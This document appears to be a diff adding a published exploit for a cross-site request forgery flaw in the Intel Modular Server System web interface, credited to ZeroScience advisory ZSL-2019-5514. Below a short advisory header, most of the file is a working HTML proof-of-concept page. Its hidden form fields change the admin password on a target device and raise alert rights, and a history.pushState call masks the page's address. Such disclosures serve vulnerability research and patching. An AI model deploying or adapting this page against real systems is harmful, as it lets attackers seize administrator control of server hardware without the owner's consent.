@@ -1,0 +1,71 @@
+<!--
+
+Intel Modular Server System 10.18 CSRF Change Admin Password Exploit
+
+
+Vendor: Intel Corporation
+Product web page: https://www.intel.com
+Affected version: 10.18.100.20130627.38849
+                  5.5.100.20091202.19584
+
+Summary: The Intel Modular Server System is a blade system manufactured by
+Intel using their own motherboards and processors. The Intel Modular Server
+System consists of an Intel Modular Server Chassis, up to six diskless Compute
+Blades, an integrated storage area network (SAN), and three to five Service
+Modules.
+
+Desc: The application interface allows users to perform certain actions via
+HTTP requests without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+Tested on: lighttpd/1.4.30
+           lighttpd/1.4.21
+           PHP/5.3.10
+           PHP/5.2.2
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5514
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5514.php
+
+
+11.03.2019
+
+-->
+
+
+<html>
+  <body>
+  <script>history.pushState('', 't00t', 'index.php')</script>
+    <form action="https://192.168.1.17:444/users/?table=User&UserId=1&action=edit&template=none" method="POST">
+      <input type="hidden" name="_dbTable[User][1][UserId]" value="1" />
+      <input type="hidden" name="_dbTable[User][1][Username]" value="admin" />
+      <input type="hidden" name="_dbTable[User][1][AuthMethod]" value="Local" />
+      <input type="hidden" name="_dbTable[User][1][Password][update]" value="on" />
+      <input type="hidden" name="_dbTable[User][1][Password][new]" value="(ontrol!23" />
+      <input type="hidden" name="_dbTable[User][1][Password][confirm]" value="(ontrol!23" />
+      <input type="hidden" name="_dbTable[User][1][AlertEmail]" value="lab@zeroscience.mk" />
+      <input type="hidden" name="_dbTable[User][1][CriticalEmail]" value="" />
+      <input type="hidden" name="_dbTable[User][1][Phone]" value="031-337-101" />
+      <input type="hidden" name="_dbTable[User][1][Locked]" value="0" />
+      <input type="hidden" name="action" value="Update" />
+      <input type="hidden" name="_dbTable[UserRights][21][Alerts]" value="3" />
+      <input type="hidden" name="_dbTable[UserRights][22][Alerts]" value="3" />
+      <input type="hidden" name="_dbTable[UserRights][23][Alerts]" value="3" />
+      <input type="hidden" name="_dbTable[UserRights][24][Alerts]" value="3" />
+      <input type="hidden" name="_dbTable[UserRights][25][Alerts]" value="3" />
+      <input type="hidden" name="_dbTable[UserRights][26][Alerts]" value="3" />
+      <input type="hidden" name="_dbTable[UserRights][27][Alerts]" value="3" />
+      <input type="hidden" name="_dbTable[UserRights][28][Alerts]" value="3" />
+      <input type="hidden" name="_dbTable[UserRights][29][Alerts]" value="3" />
+      <input type="hidden" name="_dbTable[UserRights][247][Alerts]" value="3" />
+      <input type="hidden" name="DbTable" value="User" />
+      <input type="hidden" name="DbTableKey" value="1" />
+      <input type="submit" value="Do et!" />
+    </form>
+  </body>
+</html>
